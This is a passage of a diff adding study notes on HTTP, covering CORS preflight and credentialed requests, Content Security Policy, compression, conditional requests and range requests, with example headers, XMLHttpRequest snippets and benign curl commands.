+            Now no domain other than https://foo.example can access the resource in a cross-site manner. To allow access to the resource, the Access-Control-Allow-Origin header should contain the value that was sent in the request's Origin header.
+
+        Preflighted requests:
+            Unlike “simple requests” (discussed above), "preflighted" requests first send an HTTP request by the OPTIONS method to the resource on the other domain, to determine if the actual request is safe to send. Cross-site requests are preflighted like this since they may have implications to user data.
+
+            The following is an example of a request that will be preflighted:
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', 'https://bar.other/resources/post-here/');
+                xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
+                xhr.setRequestHeader('Content-Type', 'application/xml');
+                xhr.onreadystatechange = handler;
+                xhr.send('<person><name>Arun</name></person>');
+
+            The example above creates an XML body to send with the POST request. Also, a non-standard HTTP X-PINGOTHER request header is set. Such headers are not part of HTTP/1.1, but are generally useful to web applications. Since the request uses a Content-Type of application/xml, and since a custom header is set, this request is preflighted.
+
+            Let's look at the full exchange between client and server. The first exchange is the preflight request/response:
+                Request:
+                    OPTIONS /resources/post-here/ HTTP/1.1
+                    Host: bar.other
+                    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
+                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+                    Accept-Language: en-us,en;q=0.5
+                    Accept-Encoding: gzip,deflate
+                    Connection: keep-alive
+                    Origin: http://foo.example
+                    Access-Control-Request-Method: POST
+                    Access-Control-Request-Headers: X-PINGOTHER, Content-Type
+
+                Response:
+                    HTTP/1.1 204 No Content
+                    Date: Mon, 01 Dec 2008 01:15:39 GMT
+                    Server: Apache/2
+                    Access-Control-Allow-Origin: https://foo.example
+                    Access-Control-Allow-Methods: POST, GET, OPTIONS
+                    Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
+                    Access-Control-Max-Age: 86400
+                    Vary: Accept-Encoding, Origin
+                    Keep-Alive: timeout=2, max=100
+                    Connection: Keep-Alive
+
+            Once the preflight request is complete, the real request is sent:
+                Request:
+                    POST /resources/post-here/ HTTP/1.1
+                    Host: bar.other
+                    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
+                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+                    Accept-Language: en-us,en;q=0.5
+                    Accept-Encoding: gzip,deflate
+                    Connection: keep-alive
+                    X-PINGOTHER: pingpong
+                    Content-Type: text/xml; charset=UTF-8
+                    Referer: https://foo.example/examples/preflightInvocation.html
+                    Content-Length: 55
+                    Origin: https://foo.example
+                    Pragma: no-cache
+                    Cache-Control: no-cache
+
+                    <person><name>Arun</name></person>
+
+                Response:
+                    HTTP/1.1 200 OK
+                    Date: Mon, 01 Dec 2008 01:15:40 GMT
+                    Server: Apache/2
+                    Access-Control-Allow-Origin: https://foo.example
+                    Vary: Accept-Encoding, Origin
+                    Content-Encoding: gzip
+                    Content-Length: 235
+                    Keep-Alive: timeout=2, max=99
+                    Connection: Keep-Alive
+                    Content-Type: text/plain
+
+                    [Some GZIP'd payload]
+
+            For the Request the browser determines that it needs to send the OPTIONS method request based on the request parameters that the JavaScript code snippet above was using, so that the server can respond whether it is acceptable to send the request with the actual request parameters. OPTIONS is an HTTP/1.1 method that is used to determine further information from servers, and is a safe method, meaning that it can't be used to change the resource. Note that along with the OPTIONS request, two other request headers are sent (lines 10 and 11 respectively):
+                Access-Control-Request-Method: POST
+                Access-Control-Request-Headers: X-PINGOTHER, Content-Type
+
+            The Access-Control-Request-Method header notifies the server as part of a preflight request that when the actual request is sent, it will be sent with a POST request method. The Access-Control-Request-Headers header notifies the server that when the actual request is sent, it will be sent with a X-PINGOTHER and Content-Type custom headers. The server now has an opportunity to determine whether it wishes to accept a request under these circumstances.
+
+            The server sends back a response indicating that the request method (POST) and request headers (X-PINGOTHER) are acceptable. In particular, let's look at the follwowing headers:
+                Access-Control-Allow-Origin: http://foo.example
+                Access-Control-Allow-Methods: POST, GET, OPTIONS
+                Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
+                Access-Control-Max-Age: 86400
+
+            The server responds with Access-Control-Allow-Methods and says that POST and GET are viable methods to query the resource in question. Note that this header is similar to the Allow response header, but used strictly within the context of access control.
+
+            The server also sends Access-Control-Allow-Headers with a value of "X-PINGOTHER, Content-Type", confirming that these are permitted headers to be used with the actual request. Like Access-Control-Allow-Methods, Access-Control-Allow-Headers is a comma separated list of acceptable headers.
+
+            Finally, Access-Control-Max-Age gives the value in seconds for how long the response to the preflight request can be cached for without sending another preflight request. In this case, 86400 seconds is 24 hours. Note that each browser has a maximum internal value that takes precedence when the Access-Control-Max-Age is greater.
+
+            Preflighted requests and redirects:
+                Not all browsers currently support following redirects after a preflighted request. If a redirect occurs after a preflighted request, some browsers currently will report an error message.
+
+                The CORS protocol originally required that behavior but was subsequently changed to no longer require it. However, not all browsers have implemented the change, and so still exhibit the behavior that was originally required.
+
+                Until browsers catch up with the spec, you may be able to work around this limitation by doing one or both of the following:
+                    - Change the server-side behavior to avoid the preflight and/or to avoid the redirect
+                    - Change the request such that it is a simple request that doesn’t cause a preflight
+
+                If that's not possible, then another way is to:
+                    1. Make a simple request (using Response.url for the Fetch API, or XMLHttpRequest.responseURL) to determine what URL the real preflighted request would end up at.
+                    2. Make another request (the “real” request) using the URL you obtained from Response.url or XMLHttpRequest.responseURL in the first step.
+
+                However, if the request is one that triggers a preflight due to the presence of the Authorization header in the request, you won’t be able to work around the limitation using the steps above. And you won’t be able to work around it at all unless you have control over the server the request is being made to.
+
+        Requests with credentials:
+            The most interesting capability exposed by both XMLHttpRequest or Fetch and CORS is the ability to make "credentialed" requests that are aware of HTTP cookies and HTTP Authentication information. By default, in cross-site XMLHttpRequest or Fetch invocations, browsers will not send credentials. A specific flag has to be set on the XMLHttpRequest object or the Request constructor when it is invoked.
+
+            In this example, content originally loaded from http://foo.example makes a simple GET request to a resource on http://bar.other which sets Cookies. Content on foo.example might contain JavaScript like this:
+                const invocation = new XMLHttpRequest();
+                const url = 'http://bar.other/resources/credentialed-content/';
+
+                function callOtherDomain() {
+                  if (invocation) {
+                    invocation.open('GET', url, true);
+                    invocation.withCredentials = true;
+                    invocation.onreadystatechange = handler;
+                    invocation.send();
+                  }
+                }
+
+            The withCredentials-Line shows the flag on XMLHttpRequest that has to be set in order to make the invocation with Cookies, namely the withCredentials boolean value. By default, the invocation is made without Cookies. Since this is a simple GET request, it is not preflighted, but the browser will reject any response that does not have the Access-Control-Allow-Credentials: true header, and not make the response available to the invoking web content.
+
+            Here is a sample exchange between client and server:
+                Request:
+                    GET /resources/access-control-with-credentials/ HTTP/1.1
+                    Host: bar.other
+                    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
+                    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+                    Accept-Language: en-us,en;q=0.5
+                    Accept-Encoding: gzip,deflate
+                    Connection: keep-alive
+                    Referer: http://foo.example/examples/credential.html
+                    Origin: http://foo.example
+                    Cookie: pageAccess=2
+
+                Response:
+                    HTTP/1.1 200 OK
+                    Date: Mon, 01 Dec 2008 01:34:52 GMT
+                    Server: Apache/2
+                    Access-Control-Allow-Origin: https://foo.example
+                    Access-Control-Allow-Credentials: true
+                    Cache-Control: no-cache
+                    Pragma: no-cache
+                    Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
+                    Vary: Accept-Encoding, Origin
+                    Content-Encoding: gzip
+                    Content-Length: 106
+                    Keep-Alive: timeout=2, max=100
+                    Connection: Keep-Alive
+                    Content-Type: text/plain
+
+
+                    [text/plain payload]
+
+            Although the request contains the Cookie destined for the content on http://bar.other, if bar.other did not respond with an "Access-Control-Allow-Credentials: true" the response would be ignored and not made available to web content.
+
+            Credentialed requests and wildcards:
+                When responding to a credentialed request, the server must specify an origin in the value of the Access-Control-Allow-Origin header, instead of specifying the "*" wildcard.
+
+                Because the request headers in the above example include a Cookie header, the request would fail if the value of the Access-Control-Allow-Origin header were "*". But it does not fail: Because the value of the Access-Control-Allow-Origin header is "http://foo.example" (an actual origin) rather than the "*" wildcard, the credential-cognizant content is returned to the invoking web content.
+
+                Note that the Set-Cookie response header in the example above also sets a further cookie. In case of failure, an exception—depending on the API used—is raised.
+
+            Third-party cookies:
+                Note that cookies set in CORS responses are subject to normal third-party cookie policies. In the example above, the page is loaded from foo.example, but the cookie in the response is sent by bar.other, and would thus not be saved if the user has configured their browser to reject all third-party cookies.
+
+    The HTTP response headers:
+        This section lists the HTTP response headers that servers send back for access control requests as defined by the Cross-Origin Resource Sharing specification. The previous section gives an overview of these in action.
+
+        Access-Control-Allow-Origin:
+            A returned resource may have one Access-Control-Allow-Origin header, with the following syntax:
+                Access-Control-Allow-Origin: <origin> | *
+
+            Access-Control-Allow-Origin specifies either a single origin, which tells browsers to allow that origin to access the resource; or else — for requests without credentials — the "*" wildcard, to tell browsers to allow any origin to access the resource.
+
+            For example, to allow code from the origin https://mozilla.org to access the resource, you can specify:
+                Access-Control-Allow-Origin: https://mozilla.org
+                Vary: Origin
+
+            If the server specifies a single origin rather than the "*" wildcard, then the server should also include Origin in the Vary response header — to indicate to clients that server responses will differ based on the value of the Origin request header.
+
+        Access-Control-Expose-Headers:
+            The Access-Control-Expose-Headers header lets a server whitelist headers that browsers are allowed to access.
+                Access-Control-Expose-Headers: <header-name>[, <header-name>]*
+
+            For example, the following:
+                Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header
+
+            …would allow the X-My-Custom-Header and X-Another-Custom-Header headers to be exposed to the browser.
+
+        Access-Control-Max-Age:
+            The Access-Control-Max-Age header indicates how long the results of a preflight request can be cached. For an example of a preflight request, see the above examples.
+                Access-Control-Max-Age: <delta-seconds>
+
+            The delta-seconds parameter indicates the number of seconds the results can be cached.
+
+        Access-Control-Allow-Credentials:
+            The Access-Control-Allow-Credentials header indicates whether or not the response to the request can be exposed when the credentials flag is true. When used as part of a response to a preflight request, this indicates whether or not the actual request can be made using credentials. Note that simple GET requests are not preflighted, and so if a request is made for a resource with credentials, if this header is not returned with the resource, the response is ignored by the browser and not returned to web content.
+                Access-Control-Allow-Credentials: true
+
+        Access-Control-Allow-Methods:
+            The Access-Control-Allow-Methods header specifies the method or methods allowed when accessing the resource. This is used in response to a preflight request. The conditions under which a request is preflighted are discussed above.
+                Access-Control-Allow-Methods: <method>[, <method>]*
+
+        Access-Control-Allow-Headers:
+            The Access-Control-Allow-Headers header is used in response to a preflight request to indicate which HTTP headers can be used when making the actual request.
+                Access-Control-Allow-Headers: <header-name>[, <header-name>]*
+
+    The HTTP request headers:
+        This section lists headers that clients may use when issuing HTTP requests in order to make use of the cross-origin sharing feature. Note that these headers are set for you when making invocations to servers. Developers using cross-site XMLHttpRequest capability do not have to set any cross-origin sharing request headers programmatically.
+
+        Origin:
+            The Origin header indicates the origin of the cross-site access request or preflight request.
+                Origin: <origin>
+
+            The origin is a URI indicating the server from which the request initiated. It does not include any path information, but only the server name.
+
+            Note that in any access control request, the Origin header is always sent.
+
+        Access-Control-Request-Method:
+            The Access-Control-Request-Method is used when issuing a preflight request to let the server know what HTTP method will be used when the actual request is made.
+                Access-Control-Request-Method: <method>
+
+        Access-Control-Request-Headers:
+            The Access-Control-Request-Headers header is used when issuing a preflight request to let the server know what HTTP headers will be used when the actual request is made.
+                Access-Control-Request-Headers: <field-name>[, <field-name>]*
+
+Content Security Policy (CSP):
+    Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks. These attacks are used for everything from data theft to site defacement to distribution of malware.
+
+    CSP is designed to be fully backward compatible (except CSP version 2 where there are some explicitly-mentioned inconsistencies in backward compatibility; more details here section 1.1). Browsers that don't support it still work with servers that implement it, and vice-versa: browsers that don't support CSP simply ignore it, functioning as usual, defaulting to the standard same-origin policy for web content. If the site doesn't offer the CSP header, browsers likewise use the standard same-origin policy.
+
+    To enable CSP, you need to configure your web server to return the Content-Security-Policy HTTP header (sometimes you will see mentions of the X-Content-Security-Policy header, but that's an older version and you don't need to specify it anymore).
+
+    Alternatively, the <meta> element can be used to configure a policy, for example: <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
+
+    Threats:
+        Mitigating cross site scripting:
+            A primary goal of CSP is to mitigate and report XSS attacks. XSS attacks exploit the browser's trust of the content received from the server. Malicious scripts are executed by the victim's browser because the browser trusts the source of the content, even when it's not coming from where it seems to be coming from.
+
+            CSP makes it possible for server administrators to reduce or eliminate the vectors by which XSS can occur by specifying the domains that the browser should consider to be valid sources of executable scripts. A CSP compatible browser will then only execute scripts loaded in source files received from those allowlisted domains, ignoring all other script (including inline scripts and event-handling HTML attributes).
+
+            As an ultimate form of protection, sites that want to never allow scripts to be executed can opt to globally disallow script execution.
+
+        Mitigating packet sniffing attacks:
+            In addition to restricting the domains from which content can be loaded, the server can specify which protocols are allowed to be used; for example (and ideally, from a security standpoint), a server can specify that all content must be loaded using HTTPS. A complete data transmission security strategy includes not only enforcing HTTPS for data transfer, but also marking all cookies with the secure flag and providing automatic redirects from HTTP pages to their HTTPS counterparts. Sites may also use the Strict-Transport-Security HTTP header to ensure that browsers connect to them only over an encrypted channel.
+
+    Using CSP:
+        Configuring Content Security Policy involves adding the Content-Security-Policy HTTP header to a web page and giving it values to control resources the user agent is allowed to load for that page. For example, a page that uploads and displays images could allow images from anywhere, but restrict a form action to a specific endpoint. A properly designed Content Security Policy helps protect a page against a cross site scripting attack. This article explains how to construct such headers properly, and provides examples.
+
+        Specifying your policy:
+            You can use the Content-Security-Policy HTTP header to specify your policy, like this:
+                Content-Security-Policy: policy
+
+            The policy is a string containing the policy directives describing your Content Security Policy.
+
+        Writing a policy:
+            A policy is described using a series of policy directives, each of which describes the policy for a certain resource type or policy area. Your policy should include a default-src policy directive, which is a fallback for other resource types when they don't have policies of their own (for a complete list, see the description of the default-src directive). A policy needs to include a default-src or script-src directive to prevent inline scripts from running, as well as blocking the use of eval(). A policy needs to include a default-src or style-src directive to restrict inline styles from being applied from a <style> element or a style attribute.
+
+    Examples: Common use cases:
+        Example 1:
+            A web site administrator wants all content to come from the site's own origin (this excludes subdomains.)
+                Content-Security-Policy: default-src 'self'
+
+        Example 2:
+            A web site administrator wants to allow content from a trusted domain and all its subdomains (it doesn't have to be the same domain that the CSP is set on.)
+                Content-Security-Policy: default-src 'self' *.trusted.com
+
+        Example 3:
+            A web site administrator wants to allow users of a web application to include images from any origin in their own content, but to restrict audio or video media to trusted providers, and all scripts only to a specific server that hosts trusted code.
+                Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
+
+            Here, by default, content is only permitted from the document's origin, with the following exceptions:
+                - Images may load from anywhere (note the "*" wildcard).
+
+                - Media is only allowed from media1.com and media2.com (and not from subdomains of those sites).
+
+                - Executable script is only allowed from userscripts.example.com.
+
+        Example 4:
+            A web site administrator for an online banking site wants to ensure that all its content is loaded using SSL, in order to prevent attackers from eavesdropping on requests.
+                Content-Security-Policy: default-src https://onlinebanking.jumbobank.com
+
+            The server only permits access to documents being loaded specifically over HTTPS through the single origin onlinebanking.jumbobank.com.
+
+        Example 5:
+            A web site administrator of a web mail site wants to allow HTML in email, as well as images loaded from anywhere, but not JavaScript or other potentially dangerous content.
+                Content-Security-Policy: default-src 'self' *.mailsite.com; img-src *
+
+            Note that this example doesn't specify a script-src; with the example CSP, this site uses the setting specified by the default-src directive, which means that scripts can be loaded only from the originating server.
+
+    Testing your policy:
+        To ease deployment, CSP can be deployed in report-only mode. The policy is not enforced, but any violations are reported to a provided URI. Additionally, a report-only header can be used to test a future revision to a policy without actually deploying it.
+
+        You can use the Content-Security-Policy-Report-Only HTTP header to specify your policy, like this:
+            Content-Security-Policy-Report-Only: policy
+
+        If both a Content-Security-Policy-Report-Only header and a Content-Security-Policy header are present in the same response, both policies are honored. The policy specified in Content-Security-Policy headers is enforced while the Content-Security-Policy-Report-Only policy generates reports but is not enforced.
+
+    Enabling reporting:
+        By default, violation reports aren't sent. To enable violation reporting, you need to specify the report-uri policy directive, providing at least one URI to which to deliver the reports:
+            Content-Security-Policy: default-src 'self'; report-uri http://reportcollector.example.com/collector.cgi
+
+        Then you need to set up your server to receive the reports; it can store or process them in whatever manner you feel is appropriate.
+
+    Violation report syntax:
+        The report JSON object contains the following data:
+            blocked-uri:
+                The URI of the resource that was blocked from loading by the Content Security Policy. If the blocked URI is from a different origin than the document-uri, then the blocked URI is truncated to contain just the scheme, host, and port.
+
+            disposition:
+                Either "enforce" or "report" depending on whether the Content-Security-Policy-Report-Only header or the Content-Security-Policy header is used.
+
+            document-uri:
+                The URI of the document in which the violation occurred.
+
+            effective-directive:
+                The directive whose enforcement caused the violation.
+
+            original-policy:
+                The original policy as specified by the Content-Security-Policy HTTP header.
+
+            referrer:
+                The referrer of the document in which the violation occurred.
+
+            script-sample:
+                The first 40 characters of the inline script, event handler, or style that caused the violation.
+
+            status-code:
+                The HTTP status code of the resource on which the global object was instantiated.
+
+            violated-directive:
+                The name of the policy section that was violated.
+
+    Sample violation report:
+        Let's consider a page located at http://example.com/signup.html. It uses the following policy, disallowing everything but stylesheets from cdn.example.com.
+            Content-Security-Policy: default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports
+
+        The HTML of signup.html looks like this:
+            <!DOCTYPE html>
+            <html>
+              <head>
+                <title>Sign Up</title>
+                <link rel="stylesheet" href="css/style.css">
+              </head>
+              <body>
+                ... Content ...
+              </body>
+            </html>
+
+        Can you spot the mistake? Stylesheets are only allowed to be loaded from cdn.example.com, yet the website tries to load one from its own origin (http://example.com). A browser capable of enforcing CSP will send the following violation report as a POST request to http://example.com/_/csp-reports, when the document is visited:
+            {
+              "csp-report": {
+                "document-uri": "http://example.com/signup.html",
+                "referrer": "",
+                "blocked-uri": "http://example.com/css/style.css",
+                "violated-directive": "style-src cdn.example.com",
+                "original-policy": "default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"
+              }
+            }
+
+        As you can see, the report includes the full path to the violating resource in blocked-uri. This is not always the case. For example, when the signup.html would attempt to load CSS from http://anothercdn.example.com/stylesheet.css, the browser would not include the full path but only the origin (http://anothercdn.example.com). The CSP specification gives an explanation of this odd behaviour. In summary, this is done to prevent leaking sensitive information about cross-origin resources.
+
+Compression in HTTP:
+    Compression is an important way to increase the performance of a Web site. For some documents, size reduction of up to 70% lowers the bandwidth capacity needs. Over the years, algorithms also got more efficient, and new ones are supported by clients and servers.
+
+    In practice, web developers don't need to implement compression mechanisms, both browsers and servers have it implemented already, but they have to be sure that the server is configured adequately. Compression happens at three different levels:
+        - first some file formats are compressed with specific optimized methods,
+
+        - then general encryption can happen at the HTTP level (the resource is transmitted compressed from end to end),
+
+        - and finally compression can be defined at the connection level, between two nodes of an HTTP connection.
+
+    End-to-end compression:
+        For compression, end-to-end compression is where the largest performance improvements of Web sites reside. End-to-end compression refers to a compression of the body of a message that is done by the server and will last unchanged until it reaches the client. Whatever the intermediate nodes are, they leave the body untouched.
+
+        All modern browsers and servers do support it and the only thing to negotiate is the compression algorithm to use. These algorithm are optimized for text. In the 1990s, compression technology was advancing at a rapid pace and numerous successive algorithms have been added to the set of possible choices. Nowadays, only two are relevant: gzip, the most common one, and br the new challenger.
+
+        To select the algorithm to use, browsers and servers use proactive content negotiation. The browser sends an Accept-Encoding header with the algorithm it supports and its order of precedence, the server picks one, uses it to compress the body of the response and uses the Content-Encoding header to tell the browser the algorithm it has chosen. As content negotiation has been used to choose a representation based on its encoding, the server must send a Vary header containing at least Accept-Encoding alongside this header in the response; that way, caches will be able to cache the different representations of the resource.
+
+        As compression brings significant performance improvements, it is recommended to activate it for all files, but already compressed ones like images, audio files and videos.
+
+        Apache supports compression and uses mod_deflate; for nginx there is ngx_http_gzip_module; for IIS, the <httpCompression> element.
+
+HTTP conditional requests:
+    HTTP has a concept of conditional requests, where the result, and even the success of a request, can be changed by comparing the affected resources with the value of a validator. Such requests can be useful to validate the content of a cache, and sparing a useless control, to verify the integrity of a document, like when resuming a download, or when preventing to lose updates when uploading or modifying a document on the server.
+
+    Principles:
+        HTTP conditional requests are requests that are executed differently, depending on the value of specific headers. These headers define a precondition, and the result of the request will be different if the precondition is matched or not.
+
+        The different behaviors are defined by the method of the request used, and by the set of headers used for a precondition:
+            - for safe methods, like GET, which usually tries to fetch a document, the conditional request can be used to send back the document, if relevant only. Therefore, this spares bandwidth.
+
+            - for unsafe methods, like PUT, which usually uploads a document, the conditional request can be used to upload the document, only if the original it is based on is the same as that stored on the server.
+
+    Validators:
+        All conditional headers try to check if the resource stored on the server matches a specific version. To achieve this, the conditional requests need to indicate the version of the resource. As comparing the whole resource byte to byte is impracticable, and not always what is wanted, the request transmits a value describing the version. Such values are called validators, and are of two kinds:
+            - the date of last modification of the document, the last-modified date.
+
+            - an opaque string, uniquely identifying each version, called the entity tag, or the etag.
+
+        Comparing versions of the same resource is a bit tricky: depending on the context, there are two kinds of equality checks:
+            - Strong validation is used when byte to byte identity is expected, for example when resuming a download.
+
+            - Weak validation is used when the user-agent only needs to determine if the two resources have the same content. This is even if they are minor differences; like different ads, or a footer with a different date.
+
+        The kind of validation is independent of the validator used. Both Last-Modified and ETag allow both types of validation, though the complexity to implement it on the server side may vary. HTTP uses strong validation by default, and it specifies when weak validation can be used.
+
+        Strong validation:
+            Strong validation consists of guaranteeing that the resource is, byte to byte, identical to the one it is compared too. This is mandatory for some conditional headers, and the default for the others. Strong validation is very strict and may be difficult to guarantee at the server level, but it does guarantee no data loss at any time, sometimes at the expense of performance.
+
+            It is quite difficult to have a unique identifier for strong validation with Last-Modified. Often this is done using an ETag with the MD5 hash of the resource (or a derivative).
+
+        Weak validation:
+            Weak validation differs from strong validation, as it considers two versions of the document as identical if the content is equivalent. For example, a page that would differ from another only by a different date in its footer, or different advertising, would be considered identical to the other with weak validation. These same two versions are considered different when using strong validation. Building a system of etags that creates weak validation may be complex, as it involves knowing the importance of the different elements of a page, but is very useful towards optimizing cache performance.
+
+    Conditional headers:
+        Several HTTP headers, called conditional headers, lead to conditional requests. These are:
+            If-Match:
+                Succeeds if the ETag of the distant resource is equal to one listed in this header. By default, unless the etag is prefixed with 'W/', it performs a strong validation.
+
+            If-None-Match:
+                Succeeds if the ETag of the distant resource is different to each listed in this header. By default, unless the etag is prefixed with 'W/', it performs a strong validation.
+
+            If-Modified-Since:
+                Succeeds if the Last-Modified date of the distant resource is more recent than the one given in this header.
+
+            If-Unmodified-Since:
+                Succeeds if the Last-Modified date of the distant resource is older or the same than the one given in this header.
+
+            If-Range:
+                Similar to If-Match, or If-Unmodified-Since, but can have only one single etag, or one date. If it fails, the range request fails, and instead of a 206 Partial Content response, a 200 OK is sent with the complete resource.
+
+    Use cases:
+        Cache update:
+            The most common use case for conditional requests is updating a cache. With an empty cache, or without a cache, the requested resource is sent back with a status of 200 OK.
+
+            Together with the resource, the validators are sent in the headers. In this example, both Last-Modified and ETag are sent, but it could equally have been only one of them. These validators are cached with the resource (like all headers) and will be used to craft conditional requests, once the cache becomes stale.
+
+            As long as the cache is not stale, no requests are issued at all. But once it has become stale, this is mostly controlled by the Cache-Control header, the client doesn't use the cached value directly but issues a conditional request. The value of the validator is used as a parameter of the If-Modified-Since and If-Match headers.
+
+            If the resource has not changed, the server sends back a 304 Not Modified response. This makes the cache fresh again, and the client uses the cached resource. Although there is a response/request round-trip that consumes some resources, this is more efficient than to transmit the whole resource over the wire again.
+
+            If the resource has changed, the server just sends back a 200 OK response, with the new version of the resource, like if the request wasn't conditional and the client uses this new resource (and caches it).
+
+            Besides the setting of the validators on the server side, this mechanism is transparent: all browsers manage a cache and send such conditional requests without any special work to be done by Web developers.
+
+        Integrity of a partial download:
+            Partial downloading of files is a functionality of HTTP that allows to resume previous operations, saving bandwidth and time, by keeping the already obtained information.
+
+            A server supporting partial downloads broadcasts this by sending the Accept-Ranges header. Once this happens, the client can resume a download by sending a Ranges header with the missing ranges.
+
+            The principle is simple, but there is one potential problem: if the downloaded resource has been modified between both downloads, the obtained ranges will correspond to two different versions of the resource, and the final document will be corrupted.
+
+            To prevent this, conditional requests are used. For ranges, there are two ways of doing this. The more flexible one makes use of If-Modified-Since and If-Match and the server returns an error if the precondition fails; the client then restarts the download from the beginning.
+
+            Even if this method works, it adds an extra response/request exchange when the document has been changed. This impairs performance, and HTTP has a specific header to avoid this scenario: If-Range.
+
+            This solution is more efficient, but slightly less flexible, as only one etag can be used in the condition. Rarely is such additional flexibility needed.
+
+        Avoiding the lost update problem with optimistic locking:
+            A common operation in Web applications is to update a remote document. This is very common in any file system or source control applications, but any application that allows to store remote resources needs such a mechanism. Common Web sites, like wikis and other CMS, have such a need.
+
+            With the PUT method you are able to implement this. The client first reads the original files, modifies them, and finally pushes them to the server.
+
+            Unfortunately, things get a little inaccurate as soon as we take into account concurrency. While a client is locally modifying its new copy of the resource, a second client can fetch the same resource and do the same on its copy. What happens next is very unfortunate: when they commit back to the server, the modifications from the first client are discarded by the next client push, as this second client is unaware of the first client's changes to the resource. The decision on who wins, is not communicated to the other party. Which client's changes are to be kept, will vary with the speed they commit; this depends on the performance of the clients, of the server, and even of the human editing the document at the client. The winner will change from one time to the next. This is a race condition and leads to problematic behaviors, which are difficult to detect and to debug.
+
+            There is no way to deal with this problem without annoying one of the two clients. However, lost updates and race conditions are to be avoided. We want predictable results, and expect that the clients are notified when their changes are rejected.
+
+            Conditional requests allow implementing the optimistic locking algorithm (used by most wikis or source control systems). The concept is to allow all clients to get copies of the resource, then let them modify it locally, controlling concurrency by successfully allowing the first client submitting an update. All subsequent updates, based on the now obsolete version of the resource, are rejected.
+
+            This is implemented using the If-Match or If-Unmodified-Since headers. If the etag doesn't match the original file, or if the file has been modified since it has been obtained, the change is simply rejected with a 412 Precondition Failed error. It is then up to the client to deal with the error: either by notifying the user to start again (this time on the newest version), or by showing the user a diff of both versions, helping them decide which changes they wish to keep.
+
+        Dealing with the first upload of a resource:
+            The first upload of a resource is an edge case of the previous. Like any update of a resource, it is subject to a race condition if two clients try to perform at the similar times. To prevent this, conditional requests can be used: by adding If-None-Match with the special value of '*', representing any etag. The request will succeed, only if the resource didn't exist before.
+
+            If-None-Match will only work with HTTP/1.1 (and later) compliant servers. If unsure if the server will be compliant, you need first to issue a HEAD request to the resource to check this.
+
+    Conclusion:
+        Conditional requests are a key feature of HTTP, and allow the building of efficient and complex applications. For caching or resuming downloads, the only work required for webmasters is to configure the server correctly; setting correct etags in some environments can be tricky. Once achieved, the browser will serve the expected conditional requests.
+
+        For locking mechanisms, it is the opposite: Web developers need to issue a request with the proper headers, while webmasters can mostly rely on the application to carry out the checks for them.
+
+        In both cases it's clear, conditional requests are a fundamental feature behind the Web.
+
+HTTP range requests:
+    HTTP range requests allow to send only a portion of an HTTP message from a server to a client. Partial requests are useful for large media or downloading files with pause and resume functions, for example.
+
+    Checking if a server supports partial requests:
+        If the Accept-Ranges is present in HTTP responses (and its value isn't "none"), the server supports range requests. You can check this by issuing a HEAD request with cURL, for example.
+            curl -I http://i.imgur.com/z4d4kWk.jpg
+
+            HTTP/1.1 200 OK
+            ...
+            Accept-Ranges: bytes
+            Content-Length: 146515
+
+        In this response, Accept-Ranges: bytes indicates that bytes can be used as unit to define a range. Here the Content-Length header is also useful as it indicates the full size of the image to retrieve.
+
+        If sites omit the Accept-Ranges header, they likely don't support partial requests. Some sites also explicitly send "none" as a value, indicating no support. In some apps, download managers disable their pause buttons in that case.
+            curl -I https://www.youtube.com/watch?v=EwTZ2xpQwpA
+
+            HTTP/1.1 200 OK
+            ...
+            Accept-Ranges: none
+
+    Requesting a specific range from a server:
+        If the server supports range requests, you can issue such a request by using the Range header. It indicates the part(s) of a document that the server should return.
+
+        Single part ranges:
+            We can request a single range from a resource. Again, we can test a request by using cURL. The "-H" option will append a header line to the request, which in this case is the Range header requesting the first 1024 bytes.
+                curl http://i.imgur.com/z4d4kWk.jpg -i -H "Range: bytes=0-1023"
+
+            The issued request looks like this:
+                GET /z4d4kWk.jpg HTTP/1.1
+                Host: i.imgur.com
+                Range: bytes=0-1023
+
+            The server responses with the 206 Partial Content status:
+                HTTP/1.1 206 Partial Content
+                Content-Range: bytes 0-1023/146515
+                Content-Length: 1024
+                ...
+                (binary content)
+
+            The Content-Length header now indicates the size of the requested range (and not the full size of the image). The Content-Range response header indicates where in the full resource this partial message belongs.
+
+        Multipart ranges:
+            The Range header also allows you to get multiple ranges at once in a multipart document. The ranges are separated by a comma.
+                curl http://www.example.com -i -H "Range: bytes=0-50, 100-150"
+
+            The server responses with the 206 Partial Content status and a Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5 header, indicating that a multipart byterange follows. Each part contains its own Content-Type and Content-Range fields and the required boundary parameter specifies the boundary string used to separate each body-part.
+                HTTP/1.1 206 Partial Content
+                Content-Type: multipart/byteranges; boundary=3d6b6a416f9b5
+                Content-Length: 282
+
+                --3d6b6a416f9b5
+                Content-Type: text/html
+                Content-Range: bytes 0-50/1270
+
+                <!doctype html>
+                <html>
+                <head>
+                    <title>Example Do
+                --3d6b6a416f9b5
+                Content-Type: text/html
+                Content-Range: bytes 100-150/1270
+
+                eta http-equiv="Content-type" content="text/html; c
+                --3d6b6a416f9b5--
+
+        Conditional range requests:
+            When resuming to request more parts of a resource, you need to guarantee that the stored resource has not been modified since the last fragment has been received.
+
